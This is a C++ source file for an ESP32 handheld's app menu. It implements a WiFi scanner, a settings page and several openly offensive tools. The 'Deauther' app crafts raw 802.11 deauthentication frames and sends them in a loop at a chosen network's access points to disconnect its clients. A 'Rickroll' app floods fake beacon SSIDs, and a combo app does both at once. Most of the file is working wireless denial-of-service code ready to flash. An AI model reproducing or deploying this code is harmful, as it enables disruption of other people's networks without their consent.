

#include "cpp_app.h"
#include "eeprom.h"
#include "keyboard.h"
#include "utils.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <vector>
#include <string.h>

#if __has_include("security_config.h")
    #include "security_config.h"
#else
    #define ENABLE_ADVANCED_WIFI 0
#endif





struct NetworkInfo {
    String ssid;
    uint8_t bssid[6];
    int32_t rssi;
    uint8_t channel;
    wifi_auth_mode_t encType;
};

static std::vector<NetworkInfo> scannedNetworks;
static bool scanComplete = false;


static String selectedNetworkSSID = "";
static std::vector<NetworkInfo> selectedNetworkBSSIDs;  


static void updateSelectedNetworkBSSIDs() {
    selectedNetworkBSSIDs.clear();
    for (const auto& net : scannedNetworks) {
        if (net.ssid == selectedNetworkSSID) {
            selectedNetworkBSSIDs.push_back(net);
        }
    }
}

static void scanNetworks() {
    scannedNetworks.clear();

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    int n = WiFi.scanNetworks(false, true);

    for (int i = 0; i < n; i++) {
        NetworkInfo info;
        info.ssid = WiFi.SSID(i);
        if (info.ssid.length() == 0) {
            info.ssid = "(Hidden)";
        }
        memcpy(info.bssid, WiFi.BSSID(i), 6);
        info.rssi = WiFi.RSSI(i);
        info.channel = WiFi.channel(i);
        info.encType = WiFi.encryptionType(i);
        scannedNetworks.push_back(info);
    }

    WiFi.scanDelete();
    scanComplete = true;
}





static uint8_t deauth_frame[26] = {
    0xC0, 0x00,                         
    0x00, 0x00,                         
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    0x08, 0xD1, 0xF9, 0xCD, 0x9E, 0xAD, 
    0x08, 0xD1, 0xF9, 0xCD, 0x9E, 0xAD, 
    0x00, 0x00,                         
    0x05, 0x00                          
};

static void sendDeauth(uint8_t* bssid) {
    memcpy(&deauth_frame[10], bssid, 6); 
    memcpy(&deauth_frame[16], bssid, 6); 
    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), true);
}





static uint8_t beacon_raw[] = {
    0x80, 0x00,                                                 
    0x00, 0x00,                                                 
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,                         
    0xba, 0xde, 0xaf, 0xfe, 0x00, 0x06,                         
    0xba, 0xde, 0xaf, 0xfe, 0x00, 0x06,                         
    0x00, 0x00,                                                 
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,             
    0x64, 0x00,                                                 
    0x31, 0x04,                                                 
    0x00, 0x00,        
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24, 
    0x03, 0x01, 0x01,                                           
    0x05, 0x04, 0x01, 0x02, 0x00, 0x00,                         
};

#define BEACON_SSID_OFFSET 38
#define SRCADDR_OFFSET 10
#define BSSID_OFFSET 16
#define SEQNUM_OFFSET 22

static const char* rick_ssids[] = {
    "01 Never gonna give you up",
    "02 Never gonna let you down",
    "03 Never gonna run around",
    "04 and desert you",
    "05 Never gonna make you cry",
    "06 Never gonna say goodbye",
    "07 Never gonna tell a lie",
    "08 and hurt you"
};
#define TOTAL_LINES (sizeof(rick_ssids) / sizeof(const char*))

static uint16_t seqnum[TOTAL_LINES] = {0};

static void sendBeacon(uint8_t line) {
    uint8_t beacon_rick[200];
    memcpy(beacon_rick, beacon_raw, BEACON_SSID_OFFSET - 1);
    beacon_rick[BEACON_SSID_OFFSET - 1] = strlen(rick_ssids[line]);
    memcpy(&beacon_rick[BEACON_SSID_OFFSET], rick_ssids[line], strlen(rick_ssids[line]));
    memcpy(&beacon_rick[BEACON_SSID_OFFSET + strlen(rick_ssids[line])], &beacon_raw[BEACON_SSID_OFFSET], sizeof(beacon_raw) - BEACON_SSID_OFFSET);

    
    beacon_rick[SRCADDR_OFFSET + 5] = line;
    beacon_rick[BSSID_OFFSET + 5] = line;

    
    beacon_rick[SEQNUM_OFFSET] = (seqnum[line] & 0x0f) << 4;
    beacon_rick[SEQNUM_OFFSET + 1] = (seqnum[line] & 0xff0) >> 4;
    seqnum[line]++;
    if (seqnum[line] > 0xfff) seqnum[line] = 0;

    
    esp_wifi_80211_tx(WIFI_IF_AP, beacon_rick, sizeof(beacon_raw) + strlen(rick_ssids[line]), false);
}





CPP_APP(wifi_scanner) {
    int selectedIndex = 0;
    bool needsRender = true;
    scanComplete = false;
    scannedNetworks.clear();
    
    CppApp::clear();
    CppApp::println("WiFi Scanner");
    CppApp::println("");
    CppApp::println("Scanning...");
    CppApp::refresh();
    
    scanNetworks();
    needsRender = true;  
    
    while (!CppApp::shouldExit()) {
        bool goUp = CppApp::up();
        bool goDown = CppApp::down();
        bool select = CppApp::button();
        bool back = CppApp::left();
        
        if (goUp && selectedIndex > 0) {
            selectedIndex--;
            needsRender = true;
        }
        if (goDown && selectedIndex < (int)scannedNetworks.size() - 1) {
            selectedIndex++;
            needsRender = true;
        }
        
        if (select && selectedIndex >= 0 && selectedIndex < (int)scannedNetworks.size()) {
            selectedNetworkSSID = scannedNetworks[selectedIndex].ssid;
            updateSelectedNetworkBSSIDs();
            break;
        }
        
        if (back) {
            break;
        }
        
        
        if (needsRender) {
            CppApp::clear();
            CppApp::println("WiFi Scanner");
            CppApp::println("");
            
            if (!scanComplete) {
                CppApp::println("Scanning...");
            } else if (scannedNetworks.size() == 0) {
                CppApp::println("No networks found");
            } else {
                int maxVisible = 4;
                int startIdx = 0;
                if (selectedIndex >= maxVisible) {
                    startIdx = selectedIndex - maxVisible + 1;
                }
                int endIdx = startIdx + maxVisible;
                if (endIdx > (int)scannedNetworks.size()) {
                    endIdx = scannedNetworks.size();
                }
                
                for (int i = startIdx; i < endIdx; i++) {
                    bool selected = (i == selectedIndex);
                    String line = selected ? "> " : "  ";
                    
                    String ssid = scannedNetworks[i].ssid;
                    if (ssid.length() > 12) {
                        ssid = ssid.substring(0, 9) + "...";
                    }
                    line += ssid;
                    
                    int rssi = scannedNetworks[i].rssi;
                    if (rssi > -50) line += " +++";
                    else if (rssi > -70) line += " ++";
                    else if (rssi > -85) line += " +";
                    
                    CppApp::println(line.c_str());
                }
                
                CppApp::println("");
                CppApp::println("Btn:select L:exit");
            }
            
            CppApp::refresh();
            needsRender = false;
        }
        
        CppApp::waitFrame(50);
    }
}

REGISTER_CPP_APP(wifi_scanner, "/Applications/WiFi/Scanner");





CPP_APP(wifi_deauther) {
    bool running = false;
    int packetCount = 0;
    int currentBSSID = 0;
    unsigned long lastRender = 0;
    
    
    if (selectedNetworkSSID.length() == 0 || selectedNetworkBSSIDs.size() == 0) {
        CppApp::clear();
        CppApp::println("WiFi Deauther");
        CppApp::println("");
        CppApp::println("No network");
        CppApp::println("selected!");
        CppApp::println("");
        CppApp::println("Use Scanner first");
        CppApp::println("to select target");
        CppApp::refresh();
        delay(2000);
        return;
    }
    
    
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP("ESP32_Deauth", "dummypass", 6, 1, 4);
    
    while (!CppApp::shouldExit()) {
        bool toggle = CppApp::button();
        bool back = CppApp::left();
        
        if (toggle) {
            running = !running;
            if (running) packetCount = 0;
        }
        
        if (back) {
            break;
        }
        
        
        if (running && selectedNetworkBSSIDs.size() > 0) {
            NetworkInfo& net = selectedNetworkBSSIDs[currentBSSID];
            uint8_t bssid[6];
            memcpy(bssid, net.bssid, 6);
            sendDeauth(bssid);
            packetCount++;
            currentBSSID = (currentBSSID + 1) % selectedNetworkBSSIDs.size();
        }
        
        
        if (millis() - lastRender > 100) {
            CppApp::clear();
            CppApp::println("WiFi Deauther");
            CppApp::println("");
            
            
            String targetLine = "Target: ";
            if (selectedNetworkSSID.length() > 10) {
                targetLine += selectedNetworkSSID.substring(0, 7) + "...";
            } else {
                targetLine += selectedNetworkSSID;
            }
            CppApp::println(targetLine.c_str());
            
            char buf[32];
            snprintf(buf, sizeof(buf), "BSSIDs: %d", (int)selectedNetworkBSSIDs.size());
            CppApp::println(buf);
            
            snprintf(buf, sizeof(buf), "Packets: %d", packetCount);
            CppApp::println(buf);
            
            CppApp::println(running ? "RUNNING" : "STOPPED");
            CppApp::println("");
            CppApp::println("Btn:toggle L:exit");
            
            CppApp::refresh();
            lastRender = millis();
        }
        
        
        CppApp::waitFrame(running ? 10 : 50);
    }
    
    WiFi.mode(WIFI_OFF);
}

REGISTER_CPP_APP(wifi_deauther, "/Applications/WiFi/Deauther");





CPP_APP(wifi_rickroll) {
    bool running = false;
    int packetCount = 0;
    unsigned long lastRender = 0;
    
    
    memset(seqnum, 0, sizeof(seqnum));
    
    
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP("ESP32_Rick", "dummypass", 6, 1, 4);
    
    while (!CppApp::shouldExit()) {
        bool toggle = CppApp::button();
        bool back = CppApp::left();
        
        if (toggle) {
            running = !running;
            if (running) packetCount = 0;
        }
        
        if (back) {
            break;
        }
        
        
        if (running) {
            for (uint8_t line = 0; line < TOTAL_LINES; line++) {
                sendBeacon(line);
                packetCount++;
            }
        }
        
        
        if (millis() - lastRender > 100) {
            CppApp::clear();
            CppApp::println("WiFi Rickroll");
            CppApp::println("");
            CppApp::println("Beacon Spammer");
            CppApp::println("");
            
            char buf[32];
            snprintf(buf, sizeof(buf), "Beacons: %d", packetCount);
            CppApp::println(buf);
            
            CppApp::println(running ? "RUNNING" : "STOPPED");
            CppApp::println("");
            CppApp::println("Btn:toggle L:exit");
            
            CppApp::refresh();
            lastRender = millis();
        }
        
        
        CppApp::waitFrame(running ? 10 : 50);
    }
    
    WiFi.mode(WIFI_OFF);
}

REGISTER_CPP_APP(wifi_rickroll, "/Applications/WiFi/Rickroll");





CPP_APP(wifi_combo) {
    bool running = false;
    int deauthCount = 0;
    int beaconCount = 0;
    int currentBSSID = 0;
    unsigned long lastRender = 0;
    
    
    memset(seqnum, 0, sizeof(seqnum));
    
    
    if (selectedNetworkSSID.length() == 0 || selectedNetworkBSSIDs.size() == 0) {
        CppApp::clear();
        CppApp::println("Deauth+Rickroll");
        CppApp::println("");
        CppApp::println("No network");
        CppApp::println("selected!");
        CppApp::println("");
        CppApp::println("Use Scanner first");
        CppApp::println("to select target");
        CppApp::refresh();
        delay(2000);
        return;
    }
    
    
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP("ESP32_Combo", "dummypass", 6, 1, 4);
    
    while (!CppApp::shouldExit()) {
        bool toggle = CppApp::button();
        bool back = CppApp::left();
        
        if (toggle) {
            running = !running;
            if (running) {
                deauthCount = 0;
                beaconCount = 0;
            }
        }
        
        if (back) {
            break;
        }
        
        if (running) {
            
            if (selectedNetworkBSSIDs.size() > 0) {
                NetworkInfo& net = selectedNetworkBSSIDs[currentBSSID];
                uint8_t bssid[6];
                memcpy(bssid, net.bssid, 6);
                sendDeauth(bssid);
                deauthCount++;
                currentBSSID = (currentBSSID + 1) % selectedNetworkBSSIDs.size();
            }
            
            
            for (uint8_t line = 0; line < TOTAL_LINES; line++) {
                sendBeacon(line);
                beaconCount++;
            }
        }
        
        
        if (millis() - lastRender > 100) {
            CppApp::clear();
            CppApp::println("Deauth+Rickroll");
            CppApp::println("");
            
            
            String targetLine = "Target: ";
            if (selectedNetworkSSID.length() > 10) {
                targetLine += selectedNetworkSSID.substring(0, 7) + "...";
            } else {
                targetLine += selectedNetworkSSID;
            }
            CppApp::println(targetLine.c_str());
            
            char buf[32];
            snprintf(buf, sizeof(buf), "Deauth: %d", deauthCount);
            CppApp::println(buf);
            
            snprintf(buf, sizeof(buf), "Beacons: %d", beaconCount);
            CppApp::println(buf);
            
            CppApp::println(running ? "RUNNING" : "STOPPED");
            CppApp::println("Btn:toggle L:exit");
            
            CppApp::refresh();
            lastRender = millis();
        }
        
        CppApp::waitFrame(running ? 10 : 50);
    }
    
    WiFi.mode(WIFI_OFF);
}

REGISTER_CPP_APP(wifi_combo, "/Applications/WiFi/Deauth+Rick");

CPP_APP(wifi_settings) {
    int selectedIndex = 0;
    bool needsRender = true;
    scanComplete = false;
    scannedNetworks.clear();
    
    char savedSSID[64] = {0};
    char savedPassword[128] = {0};
    eepromReadString("wifi_ssid", savedSSID, sizeof(savedSSID));
    eepromReadString("wifi_password", savedPassword, sizeof(savedPassword));
    
    CppApp::clear();
    CppApp::println("WiFi Settings");
    CppApp::println("");
    if (strlen(savedSSID) > 0) {
        CppApp::println("Current:");
        String currentLine = String("  ") + savedSSID;
        CppApp::println(currentLine.c_str());
        CppApp::println("");
    }
    CppApp::println("Scanning...");
    CppApp::refresh();
    
    showLoadingScreenOverlay("Scanning WiFi...");
    scanNetworks();
    hideLoadingScreenOverlay();
    needsRender = true;
    
    while (!CppApp::shouldExit()) {
        bool goUp = CppApp::up();
        bool goDown = CppApp::down();
        bool select = CppApp::button();
        bool back = CppApp::left();
        
        if (goUp && selectedIndex > 0) {
            selectedIndex--;
            needsRender = true;
        }
        if (goDown && selectedIndex < (int)scannedNetworks.size() - 1) {
            selectedIndex++;
            needsRender = true;
        }
        
        if (select && selectedIndex >= 0 && selectedIndex < (int)scannedNetworks.size()) {
            NetworkInfo& net = scannedNetworks[selectedIndex];
            String ssid = net.ssid;
            
            if (ssid == "(Hidden)") {
                char ssidBuffer[64] = {0};
                if (showKeyboard("Enter SSID", ssidBuffer, sizeof(ssidBuffer))) {
                    ssid = String(ssidBuffer);
                } else {
                    needsRender = true;
                    CppApp::waitFrame(10);
                    continue;
                }
            }
            
            String password = "";
            if (net.encType != WIFI_AUTH_OPEN) {
                char passwordBuffer[128] = {0};
                strncpy(passwordBuffer, savedPassword, sizeof(passwordBuffer) - 1);
                String prompt = "Password: " + ssid;
                if (showKeyboard(prompt.c_str(), passwordBuffer, sizeof(passwordBuffer))) {
                    password = String(passwordBuffer);
                } else {
                    needsRender = true;
                    CppApp::waitFrame(10);
                    continue;
                }
            }
            
            eepromWriteString("wifi_ssid", ssid.c_str());
            eepromWriteString("wifi_password", password.c_str());
            
            CppApp::clear();
            CppApp::println("WiFi Settings");
            CppApp::println("");
            CppApp::println("Saved!");
            CppApp::println("");
            String ssidLine = "SSID: " + ssid;
            CppApp::println(ssidLine.c_str());
            CppApp::println("");
            CppApp::println("Connecting...");
            CppApp::refresh();
            
            WiFi.mode(WIFI_STA);
            WiFi.begin(ssid.c_str(), password.c_str());
            
            int attempts = 0;
            while (WiFi.status() != WL_CONNECTED && attempts < 20) {
                delay(500);
                attempts++;
            }
            
            CppApp::clear();
            CppApp::println("WiFi Settings");
            CppApp::println("");
            if (WiFi.status() == WL_CONNECTED) {
                CppApp::println("Connected!");
                CppApp::println("");
                String ipLine = "IP: " + WiFi.localIP().toString();
                CppApp::println(ipLine.c_str());
            } else {
                CppApp::println("Failed!");
                CppApp::println("");
                CppApp::println("Check password");
            }
            CppApp::println("");
            CppApp::println("Press button");
            CppApp::refresh();
            
            while (!CppApp::button() && !CppApp::shouldExit()) {
                CppApp::waitFrame(10);
            }
            
            scanNetworks();
            selectedIndex = 0;
            needsRender = true;
        }
        
        if (back) {
            break;
        }
        
        if (needsRender) {
            CppApp::clear();
            CppApp::println("WiFi Settings");
            CppApp::println("");
            
            if (!scanComplete) {
                CppApp::println("Scanning...");
            } else if (scannedNetworks.size() == 0) {
                CppApp::println("No networks");
                CppApp::println("found");
            } else {
                int maxVisible = 4;
                int startIdx = 0;
                if (selectedIndex >= maxVisible) {
                    startIdx = selectedIndex - maxVisible + 1;
                }
                int endIdx = startIdx + maxVisible;
                if (endIdx > (int)scannedNetworks.size()) {
                    endIdx = scannedNetworks.size();
                }
                
                for (int i = startIdx; i < endIdx; i++) {
                    bool selected = (i == selectedIndex);
                    String line = selected ? "> " : "  ";
                    
                    String ssid = scannedNetworks[i].ssid;
                    if (ssid.length() > 12) {
                        ssid = ssid.substring(0, 9) + "...";
                    }
                    line += ssid;
                    
                    int rssi = scannedNetworks[i].rssi;
                    if (rssi > -50) line += " +++";
                    else if (rssi > -70) line += " ++";
                    else if (rssi > -85) line += " +";
                    
                    if (scannedNetworks[i].encType != WIFI_AUTH_OPEN) {
                        line += " [*]";
                    }
                    
                    CppApp::println(line.c_str());
                }
                
                CppApp::println("");
                CppApp::println("Btn:select L:exit");
            }
            
            CppApp::refresh();
            needsRender = false;
        }
        
        CppApp::waitFrame(50);
    }
}

REGISTER_CPP_APP(wifi_settings, "/Settings/WiFi");

void registerWifiApps() {
#if ENABLE_ADVANCED_WIFI
    registerCppApp("wifi_scanner", "/Applications/WiFi/Scanner", cppapp_wifi_scanner);
    registerCppApp("wifi_deauther", "/Applications/WiFi/Deauther", cppapp_wifi_deauther);
    registerCppApp("wifi_rickroll", "/Applications/WiFi/Rickroll", cppapp_wifi_rickroll);
    registerCppApp("wifi_combo", "/Applications/WiFi/Deauth+Rick", cppapp_wifi_combo);
    registerCppApp("wifi_settings", "/Settings/WiFi", cppapp_wifi_settings);
#endif
}
